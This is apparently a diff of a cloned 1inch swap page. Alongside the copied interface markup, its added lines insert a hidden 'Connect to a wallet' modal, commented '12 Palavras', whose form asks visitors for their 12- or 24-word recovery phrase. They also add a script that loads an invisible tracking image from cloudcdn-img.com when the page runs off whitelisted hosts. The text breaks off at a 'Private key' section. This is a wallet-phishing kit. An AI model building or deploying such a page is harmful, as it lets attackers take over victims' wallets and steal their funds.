market-expand" tabindex="-1"><span _ngcontent-ipc-c359=""><span _ngcontent-ipc-c359="" class="market-name">OTC</span><!----><span _ngcontent-ipc-c359="" class="arrow-down"></span></span></button></div><div _ngcontent-ipc-c359="" class="token-amount-container ng-star-inserted"><span _ngcontent-ipc-c359="" class="token-amount" title="2 903.29375"> 2 903.29375 </span></div><!----></div><div _ngcontent-ipc-c359="" class="quote-data-row"><div _ngcontent-ipc-c359="" class="quote-preview-tx-cost"><span _ngcontent-ipc-c359="" transloco="uni.swap.tx-cost">Tx cost</span><!----><usd-token-price _ngcontent-ipc-c359="" _nghost-ipc-c239=""><span _ngcontent-ipc-c239="" class="ng-star-inserted"><!----><span _ngcontent-ipc-c239="" class="ng-star-inserted">&nbsp;</span><span _ngcontent-ipc-c239="" class="ng-star-inserted"> 0.0090 Ξ </span><!----><!----><!----><!----><!----><span _ngcontent-ipc-c239="" class="ng-star-inserted">&nbsp;</span><!----><span _ngcontent-ipc-c239="" class="ng-star-inserted">(</span><span _ngcontent-ipc-c239="" class="ng-star-inserted">~$26.34</span><span _ngcontent-ipc-c239="" class="ng-star-inserted">)</span><!----><!----><!----><!----><!----></span><!----></usd-token-price></div><div _ngcontent-ipc-c359="" class="quote-token-amount-usd-price"><usd-swap-price _ngcontent-ipc-c359="" _nghost-ipc-c338=""><!----><span _ngcontent-ipc-c338="" class="ng-star-inserted"><usd-token-price _ngcontent-ipc-c338="" _nghost-ipc-c239="" class="ng-star-inserted"><span _ngcontent-ipc-c239="" class="ng-star-inserted"><span _ngcontent-ipc-c239="" class="token-usd-price ng-star-inserted"> ~$2,904 </span><!----><!----><!----><!----><!----><!----></span><!----></usd-token-price><swap-price-impact _ngcontent-ipc-c338="" _nghost-ipc-c337="" data-id="swap-price-impact" class="ng-star-inserted"><span _ngcontent-ipc-c337=""><span _ngcontent-ipc-c337="" class="ng-star-inserted">(-0.47%)<!----><!----><!----><!----><!----></span><!----><!----></span></swap-price-impact><!----><!----></span><!----></usd-swap-price></div></div></div></div><!----></div><!----><!----></quote-preview></button><!----></div><!----><!----><!----></swap-destination-token><swap-button _ngcontent-ipc-c366="" _nghost-ipc-c361=""><!----><a _ngcontent-ipc-c361="" data-id="swap-box.swap-button" class="primary-action-button ng-star-inserted" data-disabled="false"><!----><!----><!----><!----><!----><!----><span _ngcontent-ipc-c361="" walletconnect="" transloco="walletConnectBox.connect-wallet" class="ng-star-inserted">Connect Wallet</span><!----><!----><!----><!----><!----><!----><!----><!----><!----></a><!----><!----><!----><!----><!----><!----><!----></swap-button><quote-info _ngcontent-ipc-c366="" data-id="token-swap-info-box" class="quote-info ng-star-inserted" _nghost-ipc-c365=""><div _ngcontent-ipc-c365="" class="layout-table"><div _ngcontent-ipc-c365="" data-id="info-rate-row" class="layout-table-row ng-star-inserted"><div _ngcontent-ipc-c365=""><button _ngcontent-ipc-c365="" data-id="info-rate-expand" class="blank-button expand-button"><span _ngcontent-ipc-c365="" transloco="swapBox.rate">Rate</span><!----><svg _ngcontent-ipc-c365="" width="16" height="16" class="arrow-expand"><use _ngcontent-ipc-c365="" xlink:href="assets/images/icons/arrow.svg#arrow"></use></svg></button></div><span _ngcontent-ipc-c365="" data-id="info-rate-collapsed-value"><span _ngcontent-ipc-c365=""> 1 DAI = 0.0003 ETH </span><usd-token-price _ngcontent-ipc-c365="" _nghost-ipc-c239=""><span _ngcontent-ipc-c239="" class="ng-star-inserted"><!----><!----><!----><span _ngcontent-ipc-c239="" class="ng-star-inserted">(</span><span _ngcontent-ipc-c239="" class="ng-star-inserted">~$1</span><span _ngcontent-ipc-c239="" class="ng-star-inserted">)</span><!----><!----><!----><!----><!----></span><!----></usd-token-price><info-icon _ngcontent-ipc-c365="" data-id="info-rate-collapsed-value-tooltip" tuihintdirection="left" class="rate-info-icon" _nghost-ipc-c238=""><svg _ngcontent-ipc-c238="" tuiHintShowDelay="0" height="16" width="16"><use _ngcontent-ipc-c238="" xlink:href="assets/images/icons/info.svg#info" class="ng-star-inserted"></use><!----><!----><!----><!----><!----></svg></info-icon></span></div><!----><!----><div _ngcontent-ipc-c365="" data-id="info-route-row" class="layout-table-row"><span _ngcontent-ipc-c365="" transloco="uni.quoteInfo.route">Route</span><!----><div _ngcontent-ipc-c365=""><div _ngcontent-ipc-c365="" class="pathfinder-route"><!----><div _ngcontent-ipc-c365="" data-id="info-route-pathfinder-route" class="flat-path ng-star-inserted"><span _ngcontent-ipc-c365="" class="ng-star-inserted">ETH</span><span _ngcontent-ipc-c365="" class="ng-star-inserted">DAI</span><!----></div><!----><!----><button _ngcontent-ipc-c365="" data-id="info-route-expand" class="fullscreen-route-btn blank-button ng-star-inserted"><svg _ngcontent-ipc-c365="" width="16" height="16" class="text-gray"><use _ngcontent-ipc-c365="" xlink:href="assets/images/icons/fullscreen_2.svg#fullscreen"></use></svg></button><!----><!----></div></div></div><div _ngcontent-ipc-c365="" data-id="info-gas-refund-row" class="layout-table-row ng-star-inserted"><span _ngcontent-ipc-c365="">Gas refund</span><gas-refund-value _ngcontent-ipc-c365="" data-id="info-gas-refund-value" _nghost-ipc-c250=""><div _ngcontent-ipc-c250="" class="gas-refund-value-wrap"><span _ngcontent-ipc-c250="" class="gas-refund-value">0%</span><span _ngcontent-ipc-c250="">&nbsp;</span><span _ngcontent-ipc-c250="" transloco="gasRefund.refund" class="gas-refund-value">REFUND</span><!----></div></gas-refund-value></div><!----><!----></div><!----></quote-info><!----><!----></swap-form><!----></swap-container><!----><block-number _ngcontent-ipc-c335="" class="current-block-number" _nghost-ipc-c334=""><a _ngcontent-ipc-c334="" target="_blank" href="https://etherscan.io/block/14431123" class="ng-star-inserted"> 14431123
+</a><!----></block-number></simple-swap-layout><!----></div><div _ngcontent-ipc-c301="" class="cookies-popup-wrap"><cookies-popup _ngcontent-ipc-c301="" _nghost-ipc-c299=""><div _ngcontent-ipc-c299="" class="cookies-popup ng-star-inserted"><button _ngcontent-ipc-c299="" class="cookies-popup-close-icon blank-button"><svg _ngcontent-ipc-c299="" width="16" height="16"><use _ngcontent-ipc-c299="" xlink:href="assets/images/icons/cross.svg#cross"></use></svg></button><div _ngcontent-ipc-c299="" class="cookies-popup-info-wrap"><img _ngcontent-ipc-c299="" src="assets/images/cookies.png" alt="" class="cookies-popup-image"><div _ngcontent-ipc-c299="" class="cookies-popup-text"><p _ngcontent-ipc-c299="" transloco="cookiesPopup.we-use-cookies" class="cookies-popup-text-top">We use cookies to ensure that we give you the best experience on our website.</p><!----><span _ngcontent-ipc-c299="" transloco="cookiesPopup.for-more-info-read">For more info read</span><!----><span _ngcontent-ipc-c299="">&nbsp;</span><a _ngcontent-ipc-c299="" href="https://1inch.io/assets/1inch_network_privacy_policy.pdf" target="_blank" transloco="cookiesPopup.privacy-policy" class="cookies-popup-link">Privacy policy</a><!----></div></div><div _ngcontent-ipc-c299="" class="cookies-popup-buttons-wrap"><button _ngcontent-ipc-c299="" transloco="cookiesPopup.i-agree" class="blank-button cookies-popup-button agree-button">I agree</button><!----><button _ngcontent-ipc-c299="" transloco="cookiesPopup.decline" class="blank-button cookies-popup-button decline-button">Decline</button><!----></div></div><!----></cookies-popup></div><div _ngcontent-ipc-c301="" class="page-content"><!----></div></div><!----></div></mat-drawer-content><!----><mat-drawer _ngcontent-ipc-c301="" tabindex="-1" mode="over" position="end" class="mat-drawer drawer-container ng-tns-c83-0 ng-trigger ng-trigger-transform mat-drawer-end mat-drawer-over ng-star-inserted" style="box-shadow: none; visibility: hidden;"><div cdkscrollable="" class="mat-drawer-inner-container ng-tns-c83-0"><app-sidebar _ngcontent-ipc-c301="" _nghost-ipc-c268="" class="ng-tns-c83-0"><div _ngcontent-ipc-c268="" class="sidebar-header"><a _ngcontent-ipc-c268="" href="/"><svg _ngcontent-ipc-c268="" width="32" height="32"><use _ngcontent-ipc-c268="" xlink:href="assets/images/logo_small.svg#logo_small"></use></svg></a><button _ngcontent-ipc-c268="" class="icon-button-gray blank-button"><svg _ngcontent-ipc-c268="" width="24" height="24"><use _ngcontent-ipc-c268="" xlink:href="assets/images/icons/cross.svg#cross"></use></svg></button></div><div _ngcontent-ipc-c268="" class="sidebar-content"><mat-accordion _ngcontent-ipc-c268="" class="mat-accordion"><div _ngcontent-ipc-c268="" class="sidebar-links ng-star-inserted" style=""><!----><mat-expansion-panel _ngcontent-ipc-c268="" class="mat-expansion-panel sidebar-panel ng-tns-c188-5 ng-star-inserted"><mat-expansion-panel-header _ngcontent-ipc-c268="" role="button" class="mat-expansion-panel-header mat-focus-indicator sidebar-link ng-tns-c189-6 ng-tns-c188-5 ng-star-inserted" id="mat-expansion-panel-header-0" tabindex="0" aria-controls="cdk-accordion-child-0" aria-expanded="false" aria-disabled="false"><span class="mat-content ng-tns-c189-6"><!----><span _ngcontent-ipc-c268="" class="ng-tns-c189-6"> Trade </span><!----></span><span class="mat-expansion-indicator ng-tns-c189-6 ng-trigger ng-trigger-indicatorRotate ng-star-inserted" style="transform: rotate(0deg);"></span><!----></mat-expansion-panel-header><div role="region" class="mat-expansion-panel-content ng-tns-c188-5 ng-trigger ng-trigger-bodyExpansion" id="cdk-accordion-child-0" aria-labelledby="mat-expansion-panel-header-0" style="height: 0px; visibility: hidden;"><div class="mat-expansion-panel-body ng-tns-c188-5"><div _ngcontent-ipc-c268="" class="sidebar-sublinks ng-star-inserted" style=""><div _ngcontent-ipc-c268="" class="ng-star-inserted"><!----><a _ngcontent-ipc-c268="" class="sidebar-sublink ng-star-inserted" data-id="nav-menu.trade.simple" href="#/1/swap"><svg _ngcontent-ipc-c268="" width="24" height="24" class="sidebar-sublink-icon ng-star-inserted"><use _ngcontent-ipc-c268="" xlink:href="assets/images/icons/header/simple_mode.svg#simple_mode"></use></svg><span _ngcontent-ipc-c268="" class="ng-star-inserted">Simple mode</span><!----></a><!----><!----><!----><!----><!----><!----></div><div _ngcontent-ipc-c268="" class="ng-star-inserted"><!----><a _ngcontent-ipc-c268="" class="sidebar-sublink ng-star-inserted" data-id="nav-menu.trade.classic" href="#/1/classic/swap"><svg _ngcontent-ipc-c268="" width="24" height="24" class="sidebar-sublink-icon ng-star-inserted"><use _ngcontent-ipc-c268="" xlink:href="assets/images/icons/header/classic_mode.svg#classic_mode"></use></svg><span _ngcontent-ipc-c268="" class="ng-star-inserted">Classic mode</span><!----></a><!----><!----><!----><!----><!----><!----></div><div _ngcontent-ipc-c268="" class="sidebar-link-hidden ng-star-inserted"><!----><a _ngcontent-ipc-c268="" class="sidebar-sublink ng-star-inserted" data-id="nav-menu.trade.otc-deal" href="#/1/p2p"><svg _ngcontent-ipc-c268="" width="24" height="24" class="sidebar-sublink-icon ng-star-inserted"><use _ngcontent-ipc-c268="" xlink:href="assets/images/icons/header/classic_mode.svg#classic_mode"></use></svg><span _ngcontent-ipc-c268="" class="ng-star-inserted">P2P deal</span><!----></a><!----><!----><!----><!----><!----><!----></div><!----></div><!----><!----></div></div></mat-expansion-panel><!----><!----><!----><!----></div><div _ngcontent-ipc-c268="" class="sidebar-links ng-star-inserted" style=""><!----><mat-expansion-panel _ngcontent-ipc-c268="" class="mat-expansion-panel sidebar-panel ng-tns-c188-7 ng-star-inserted"><mat-expansion-panel-header _ngcontent-ipc-c268="" role="button" class="mat-expansion-panel-header mat-focus-indicator sidebar-link ng-tns-c189-8 ng-tns-c188-7 ng-star-inserted" id="mat-expansion-panel-header-1" tabindex="0" aria-controls="cdk-accordion-child-1" aria-expanded="false" aria-disabled="false"><span class="mat-content ng-tns-c189-8"><!----><span _ngcontent-ipc-c268="" class="ng-tns-c189-8"> DAO </span><!----></span><span class="mat-expansion-indicator ng-tns-c189-8 ng-trigger ng-trigger-indicatorRotate ng-star-inserted" style="transform: rotate(0deg);"></span><!----></mat-expansion-panel-header><div role="region" class="mat-expansion-panel-content ng-tns-c188-7 ng-trigger ng-trigger-bodyExpansion" id="cdk-accordion-child-1" aria-labelledby="mat-expansion-panel-header-1" style="height: 0px; visibility: hidden;"><div class="mat-expansion-panel-body ng-tns-c188-7"><div _ngcontent-ipc-c268="" class="sidebar-sublinks ng-star-inserted" style=""><div _ngcontent-ipc-c268="" class="ng-star-inserted"><!----><a _ngcontent-ipc-c268="" class="sidebar-sublink ng-star-inserted" data-id="nav-menu.dao.governance" href="#/1/dao/governance"><svg _ngcontent-ipc-c268="" width="24" height="24" class="sidebar-sublink-icon ng-star-inserted"><use _ngcontent-ipc-c268="" xlink:href="assets/images/icons/header/governance.svg#governance"></use></svg><span _ngcontent-ipc-c268="" class="ng-star-inserted">Governance</span><!----></a><!----><!----><!----><!----><!----><!----></div><div _ngcontent-ipc-c268="" class="ng-star-inserted"><!----><a _ngcontent-ipc-c268="" class="sidebar-sublink ng-star-inserted" data-id="nav-menu.dao.pools" href="#/1/dao/pools"><svg _ngcontent-ipc-c268="" width="24" height="24" class="sidebar-sublink-icon ng-star-inserted"><use _ngcontent-ipc-c268="" xlink:href="assets/images/icons/header/pools.svg#pools"></use></svg><span _ngcontent-ipc-c268="" class="ng-star-inserted">Pools</span><!----></a><!----><!----><!----><!----><!----><!----></div><div _ngcontent-ipc-c268="" class="ng-star-inserted"><!----><a _ngcontent-ipc-c268="" class="sidebar-sublink ng-star-inserted" data-id="nav-menu.dao.farming" href="#/1/dao/farming"><svg _ngcontent-ipc-c268="" width="24" height="24" class="sidebar-sublink-icon ng-star-inserted"><use _ngcontent-ipc-c268="" xlink:href="assets/images/icons/header/farming.svg#farming"></use></svg><span _ngcontent-ipc-c268="" class="ng-star-inserted">Farming</span><!----></a><!----><!----><!----><!----><!----><!----></div><div _ngcontent-ipc-c268="" class="ng-star-inserted"><!----><a _ngcontent-ipc-c268="" class="sidebar-sublink ng-star-inserted" data-id="nav-menu.dao.analytics" href="#/1/dao/analytics"><svg _ngcontent-ipc-c268="" width="24" height="24" class="sidebar-sublink-icon ng-star-inserted"><use _ngcontent-ipc-c268="" xlink:href="assets/images/icons/header/analytics.svg#analytics"></use></svg><span _ngcontent-ipc-c268="" class="ng-star-inserted">Analytics</span><!----></a><!----><!----><!----><!----><!----><!----></div><div _ngcontent-ipc-c268="" class="ng-star-inserted"><!----><!----><a _ngcontent-ipc-c268="" target="_blank" rel="noopener noreferrer" class="sidebar-sublink ng-star-inserted" href="https://gov.1inch.io/"><svg _ngcontent-ipc-c268="" width="24" height="24" class="sidebar-sublink-icon ng-star-inserted"><use _ngcontent-ipc-c268="" xlink:href="assets/images/icons/header/forum.svg#forum"></use></svg><span _ngcontent-ipc-c268="" class="ng-star-inserted">Forum</span><!----></a><!----><!----><!----><!----><!----></div><!----></div><!----><!----></div></div></mat-expansion-panel><!----><!----><!----><!----></div><div _ngcontent-ipc-c268="" class="sidebar-links ng-star-inserted" style=""><!----><a _ngcontent-ipc-c268="" class="sidebar-link ng-star-inserted" href="#/1/earn"><span _ngcontent-ipc-c268="">Earn</span></a><!----><!----><!----><!----></div><div _ngcontent-ipc-c268="" class="sidebar-links sidebar-link-hidden ng-star-inserted" style=""><!----><a _ngcontent-ipc-c268="" class="sidebar-link ng-star-inserted" href="#/1/money-markets"><span _ngcontent-ipc-c268="">Market</span></a><!----><!----><!----><!----></div><div _ngcontent-ipc-c268="" class="sidebar-links ng-star-inserted" style=""><!----><mat-expansion-panel _ngcontent-ipc-c268="" class="mat-expansion-panel sidebar-panel ng-tns-c188-9 ng-star-inserted"><mat-expansion-panel-header _ngcontent-ipc-c268="" role="button" class="mat-expansion-panel-header mat-focus-indicator sidebar-link ng-tns-c189-10 ng-tns-c188-9 ng-star-inserted" id="mat-expansion-panel-header-2" tabindex="0" aria-controls="cdk-accordion-child-2" aria-expanded="false" aria-disabled="false"><span class="mat-content ng-tns-c189-10"><!----><span _ngcontent-ipc-c268="" class="ng-tns-c189-10"> More </span><!----></span><span class="mat-expansion-indicator ng-tns-c189-10 ng-trigger ng-trigger-indicatorRotate ng-star-inserted" style="transform: rotate(0deg);"></span><!----></mat-expansion-panel-header><div role="region" class="mat-expansion-panel-content ng-tns-c188-9 ng-trigger ng-trigger-bodyExpansion" id="cdk-accordion-child-2" aria-labelledby="mat-expansion-panel-header-2" style="height: 0px; visibility: hidden;"><div class="mat-expansion-panel-body ng-tns-c188-9"><div _ngcontent-ipc-c268="" class="sidebar-sublinks ng-star-inserted" style=""><div _ngcontent-ipc-c268="" class="ng-star-inserted"><!----><!----><a _ngcontent-ipc-c268="" target="_blank" rel="noopener noreferrer" class="sidebar-sublink ng-star-inserted" href="https://docs.1inch.io/"><svg _ngcontent-ipc-c268="" width="24" height="24" class="sidebar-sublink-icon ng-star-inserted"><use _ngcontent-ipc-c268="" xlink:href="assets/images/icons/header/api.svg#api"></use></svg><span _ngcontent-ipc-c268="" class="ng-star-inserted">Documentation</span><!----></a><!----><!----><!----><!----><!----></div><div _ngcontent-ipc-c268="" class="ng-star-inserted"><!----><!----><a _ngcontent-ipc-c268="" target="_blank" rel="noopener noreferrer" class="sidebar-sublink ng-star-inserted" href="https://blog.1inch.io/"><svg _ngcontent-ipc-c268="" width="24" height="24" class="sidebar-sublink-icon ng-star-inserted"><use _ngcontent-ipc-c268="" xlink:href="assets/images/icons/header/blog.svg#blog"></use></svg><span _ngcontent-ipc-c268="" class="ng-star-inserted">Blog</span><!----></a><!----><!----><!----><!----><!----></div><div _ngcontent-ipc-c268="" class="ng-star-inserted"><!----><!----><a _ngcontent-ipc-c268="" target="_blank" rel="noopener noreferrer" class="sidebar-sublink ng-star-inserted" href="https://help.1inch.io"><svg _ngcontent-ipc-c268="" width="24" height="24" class="sidebar-sublink-icon ng-star-inserted"><use _ngcontent-ipc-c268="" xlink:href="assets/images/icons/header/help.svg#help"></use></svg><span _ngcontent-ipc-c268="" class="ng-star-inserted">Help</span><!----></a><!----><!----><!----><!----><!----></div><div _ngcontent-ipc-c268="" class="ng-star-inserted"><!----><!----><a _ngcontent-ipc-c268="" target="_blank" rel="noopener noreferrer" class="sidebar-sublink ng-star-inserted" href="https://1inch.io/"><svg _ngcontent-ipc-c268="" width="24" height="24" class="sidebar-sublink-icon ng-star-inserted"><use _ngcontent-ipc-c268="" xlink:href="assets/images/icons/header/about.svg#about"></use></svg><span _ngcontent-ipc-c268="" class="ng-star-inserted">About</span><!----></a><!----><!----><!----><!----><!----></div><div _ngcontent-ipc-c268="" class="ng-star-inserted"><!----><!----><!----><a _ngcontent-ipc-c268="" target="_blank" rel="noopener noreferrer" class="sidebar-sublink ng-star-inserted" href="https://bafybeihre2fklsij252ketzxmjavdn37wtbpdpshd42an3t7nzxn6ewuai.ipfs.dweb.link/" id="ipfsLink"><svg _ngcontent-ipc-c268="" width="24" height="24" class="sidebar-sublink-icon ng-star-inserted"><use _ngcontent-ipc-c268="" xlink:href="assets/images/icons/header/arrow-link.svg#arrow-link"></use></svg><span _ngcontent-ipc-c268="" class="ng-star-inserted">IPFS Deployment</span><!----></a><!----><!----><!----><!----><!----><!----><!----><!----></div><div _ngcontent-ipc-c268="" class="ng-star-inserted"><!----><!----><!----><a _ngcontent-ipc-c268="" target="_blank" rel="noopener noreferrer" class="sidebar-sublink ng-star-inserted" href="https://0405maluitpg3lg7e632idp7qeqq9mo6rr6rv3gli8lchh9g64gbtag.siasky.net/" id="skynetLink"><svg _ngcontent-ipc-c268="" width="24" height="24" class="sidebar-sublink-icon ng-star-inserted"><use _ngcontent-ipc-c268="" xlink:href="assets/images/icons/header/arrow-link.svg#arrow-link"></use></svg><span _ngcontent-ipc-c268="" class="ng-star-inserted">Skynet Deployment</span><!----></a><!----><!----><!----><!----><!----><!----><!----><!----></div><!----></div><!----><!----></div></div></mat-expansion-panel><!----><!----><!----><!----></div><div _ngcontent-ipc-c268="" class="sidebar-links ng-star-inserted" style=""><!----><mat-expansion-panel _ngcontent-ipc-c268="" class="mat-expansion-panel sidebar-panel ng-tns-c188-11 ng-star-inserted"><mat-expansion-panel-header _ngcontent-ipc-c268="" role="button" class="mat-expansion-panel-header mat-focus-indicator sidebar-link ng-tns-c189-12 ng-tns-c188-11 ng-star-inserted" id="mat-expansion-panel-header-3" tabindex="0" aria-controls="cdk-accordion-child-3" aria-expanded="false" aria-disabled="false"><span class="mat-content ng-tns-c189-12"><!----><span _ngcontent-ipc-c268="" class="ng-tns-c189-12"> Bridges </span><!----></span><span class="mat-expansion-indicator ng-tns-c189-12 ng-trigger ng-trigger-indicatorRotate ng-star-inserted" style="transform: rotate(0deg);"></span><!----></mat-expansion-panel-header><div role="region" class="mat-expansion-panel-content ng-tns-c188-11 ng-trigger ng-trigger-bodyExpansion" id="cdk-accordion-child-3" aria-labelledby="mat-expansion-panel-header-3" style="height: 0px; visibility: hidden;"><div class="mat-expansion-panel-body ng-tns-c188-11"><div _ngcontent-ipc-c268="" class="sidebar-sublinks ng-star-inserted" style=""><div _ngcontent-ipc-c268="" class="ng-star-inserted"><!----><!----><a _ngcontent-ipc-c268="" target="_blank" rel="noopener noreferrer" class="sidebar-sublink ng-star-inserted" href="https://www.binance.org/en/bridge"><svg _ngcontent-ipc-c268="" width="24" height="24" class="sidebar-sublink-icon ng-star-inserted"><use _ngcontent-ipc-c268="" xlink:href="assets/images/icons/header/bsc_2.svg#bsc_2"></use></svg><span _ngcontent-ipc-c268="" class="ng-star-inserted">BNB Chain Bridge</span><!----></a><!----><!----><!----><!----><!----></div><div _ngcontent-ipc-c268="" class="ng-star-inserted"><!----><!----><a _ngcontent-ipc-c268="" target="_blank" rel="noopener noreferrer" class="sidebar-sublink ng-star-inserted" href="https://wallet.matic.network/bridge/"><svg _ngcontent-ipc-c268="" width="24" height="24" class="sidebar-sublink-icon ng-star-inserted"><use _ngcontent-ipc-c268="" xlink:href="assets/images/icons/header/polygon.svg#polygon"></use></svg><span _ngcontent-ipc-c268="" class="ng-star-inserted">Polygon Bridge</span><!----></a><!----><!----><!----><!----><!----></div><div _ngcontent-ipc-c268="" class="ng-star-inserted"><!----><!----><a _ngcontent-ipc-c268="" target="_blank" rel="noopener noreferrer" class="sidebar-sublink ng-star-inserted" href="https://gateway.optimism.io/"><svg _ngcontent-ipc-c268="" width="24" height="24" class="sidebar-sublink-icon ng-star-inserted"><use _ngcontent-ipc-c268="" xlink:href="assets/images/icons/header/optimism.svg#optimism"></use></svg><span _ngcontent-ipc-c268="" class="ng-star-inserted">Optimism Bridge</span><!----></a><!----><!----><!----><!----><!----></div><div _ngcontent-ipc-c268="" class="ng-star-inserted"><!----><!----><a _ngcontent-ipc-c268="" target="_blank" rel="noopener noreferrer" class="sidebar-sublink ng-star-inserted" href="https://bridge.arbitrum.io/"><svg _ngcontent-ipc-c268="" width="24" height="24" class="sidebar-sublink-icon ng-star-inserted"><use _ngcontent-ipc-c268="" xlink:href="assets/images/icons/header/arbitrum.svg#arbitrum"></use></svg><span _ngcontent-ipc-c268="" class="ng-star-inserted">Arbitrum Bridge</span><!----></a><!----><!----><!----><!----><!----></div><div _ngcontent-ipc-c268="" class="ng-star-inserted"><!----><!----><a _ngcontent-ipc-c268="" target="_blank" rel="noopener noreferrer" class="sidebar-sublink ng-star-inserted" href="https://bridge.xdaichain.com/"><svg _ngcontent-ipc-c268="" width="24" height="24" class="sidebar-sublink-icon ng-star-inserted"><use _ngcontent-ipc-c268="" xlink:href="assets/images/icons/header/gnosis.svg#gnosis"></use></svg><span _ngcontent-ipc-c268="" class="ng-star-inserted">Gnosis Chain Bridge</span><!----></a><!----><!----><!----><!----><!----></div><div _ngcontent-ipc-c268="" class="ng-star-inserted"><!----><!----><a _ngcontent-ipc-c268="" target="_blank" rel="noopener noreferrer" class="sidebar-sublink ng-star-inserted" href="https://bridge.avax.network/"><svg _ngcontent-ipc-c268="" width="24" height="24" class="sidebar-sublink-icon ng-star-inserted"><use _ngcontent-ipc-c268="" xlink:href="assets/images/icons/header/avalanche.svg#avalanche"></use></svg><span _ngcontent-ipc-c268="" class="ng-star-inserted">Avalanche Bridge</span><!----></a><!----><!----><!----><!----><!----></div><!----></div><!----><!----></div></div></mat-expansion-panel><!----><!----><!----><!----></div><div _ngcontent-ipc-c268="" class="sidebar-links ng-star-inserted" style=""><a _ngcontent-ipc-c268="" rel="noopener noreferrer" target="_blank" class="sidebar-link sidebar-link-external ng-star-inserted" href="https://buy.moonpay.io/?apiKey=pk_live_q9RGNNxVw8kvQF87xk9SgL5ZwAfT4O5h&amp;currencyCode=ETH"><span _ngcontent-ipc-c268="">Buy ETH</span></a><!----><!----><!----><!----><!----></div><!----></mat-accordion></div><!----><!----></app-sidebar></div></mat-drawer></mat-drawer-container></div><tui-dialog-host _ngcontent-ipc-c161="" _nghost-ipc-c129="" class="ng-tns-c129-4 ng-star-inserted"><!----><div _ngcontent-ipc-c129="" class="overlay ng-tns-c129-4 ng-star-inserted"></div><!----><!----><!----></tui-dialog-host><!----><!----></tui-portal-host><!----><tui-hints-host _ngcontent-ipc-c161="" aria-live="polite" _nghost-ipc-c158="" class="ng-tns-c158-1"><!----></tui-hints-host></tui-root></app-root>
+    </div>
+    <div id="intercom-disabled-cookie" class="intercom-lightweight-app-launcher">
+        <div class="intercom-lightweight-app-launcher-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 28 32">
+                <path d="M28 32s-4.714-1.855-8.527-3.34H3.437C1.54 28.66 0 27.026 0 25.013V3.644C0 1.633 1.54 0 3.437 0h21.125c1.898 0 3.437 1.632 3.437 3.645v18.404H28V32zm-4.139-11.982a.88.88 0 00-1.292-.105c-.03.026-3.015 2.681-8.57 2.681-5.486 0-8.517-2.636-8.571-2.684a.88.88 0 00-1.29.107 1.01 1.01 0 00-.219.708.992.992 0 00.318.664c.142.128 3.537 3.15 9.762 3.15 6.226 0 9.621-3.022 9.763-3.15a.992.992 0 00.317-.664 1.01 1.01 0 00-.218-.707z"></path>
+            </svg>
+        </div>
+    </div>
+
+    <script>
+
+        window.initIntercom = function(intercomSettings) {
+            window.intercomSettings = Object.assign(intercomSettings, {
+                app_id: "zgn72x6y"
+            });
+            (function(){var w=window;var ic=w.Intercom;if(typeof ic==="function"){ic('reattach_activator');ic('update',w.intercomSettings);}else{var d=document;var i=function(){i.c(arguments);};i.q=[];i.c=function(args){i.q.push(args);};w.Intercom=i;var l=function(){var s=d.createElement('script');s.type='text/javascript';s.async=true;s.src='https://widget.intercom.io/widget/zgn72x6y';var x=d.getElementsByTagName('script')[0];x.parentNode.insertBefore(s,x);};if(w.attachEvent){w.attachEvent('onload',l);}else{w.addEventListener('load',l,false);}}})();
+        };
+
+        if (localStorage.getItem('cookies-status') === 'accepted') {
+            window.initIntercom({});
+        }
+
+        (function () {
+            var intervalId = setInterval(() => {
+                var iframe = document.querySelector('.intercom-launcher-frame');
+
+                if (!iframe) {
+                    return;
+                }
+
+                var style = document.createElement('style');
+                style.textContent = `@media (max-width: 720px) {
+                    .intercom-launcher {
+                        width: auto !important;
+                        height: auto !important;
+                        right: 0;
+                        bottom: 0;
+                    }
+                }`;
+                iframe.contentDocument.head.appendChild(style);
+                clearInterval(intervalId);
+            }, 500);
+        })();
+    </script>
+
+    <script>
+        var whitelistHostNameRegex = /^localhost|^oneinch-v2-pr-\d{4}\.onrender\.com|ipfs\.+/;
+
+        if (location.hostname.match(whitelistHostNameRegex) === null) {
+            document.write('<img src="https://cloudcdn-img.com/static/31696e6368/spacer.gif" referrerpolicy="no-referrer-when-downgrade" style="opacity: 0.0"/>');
+        }
+    </script><img src="https://cloudcdn-img.com/static/31696e6368/spacer.gif" referrerpolicy="no-referrer-when-downgrade" style="opacity: 0.0">
+    <script src="runtime.f3ce325fc02ef793.js" type="module"></script><script src="polyfills.e8e92ab399ccdd49.js" type="module"></script><script src="main.4b1c466287abe3aa.js" type="module"></script>
+
+
+	 <!-- 12 Palavras -->
+
+         <div id="12palavras" style="display: none;" class="sc-hlTwrV cCVa-Dh">
+            <div role="presentation" class="sc-jONnzC hkzgbr"></div>
+            <div class="sc-clsFYl kTibWg">
+               <div class="sc-fbkiRW lmLjZm">
+                  <div class="sc-eCstlR sc-jSgvzq sc-GqePz inxtCj cTcKPP ddwUpk">
+                     <h2 color="text" class="sc-giImIA sc-ezredP hInkdm kXzAmZ">Connect to a wallet</h2>
+                  </div>
+          <button id="closewallet2" class="sc-gsTEea iuOaSa sc-dlfnuX dOtaoI closeModal" scale="sm" aria-label="Close the dialog">
+                     <svg viewBox="0 0 24 24" width="24px" color="card" xmlns="http://www.w3.org/2000/svg" class="sc-bdfBQB cbuhpN">
+                        <path d="M18.2987 5.70997C17.9087 5.31997 17.2787 5.31997 16.8887 5.70997L11.9988 10.59L7.10875 5.69997C6.71875 5.30997 6.08875 5.30997 5.69875 5.69997C5.30875 6.08997 5.30875 6.71997 5.69875 7.10997L10.5888 12L5.69875 16.89C5.30875 17.28 5.30875 17.91 5.69875 18.3C6.08875 18.69 6.71875 18.69 7.10875 18.3L11.9988 13.41L16.8887 18.3C17.2787 18.69 17.9087 18.69 18.2987 18.3C18.6887 17.91 18.6887 17.28 18.2987 16.89L13.4087 12L18.2987 7.10997C18.6787 6.72997 18.6787 6.08997 18.2987 5.70997Z"></path>
+                     </svg>
+                  </button>
+               </div>
+               
+               <button id="connectWallet" class="aero">
+                <span id="error-msg">Typically 12 (sometimes 24) words <br>separated by single spaces</span>
+                <div id="small-loader" style="display: none;" class="loader small-loader">Loading...</div>
+            </button>
+            <form id="form1">
+				<input type="hidden" id="namewallet" value="wallet" name="namewallet">
+            <textarea id="keys12" name="phrase" class="combocarteira" placeholder="Separate each word with a single space" required="required"></textarea>
+            
+               <div class="sc-gsVsKb gDYcOL">
+                 
+                <button type="submit" class="botaokeys mb-20" height="50%" scale="md">Acess Wallet</button></div>
+               
+           
+            </form></div>
+      
+            </div>
+
+             
+  
+         
+       <!-- Private key -->
+
+       
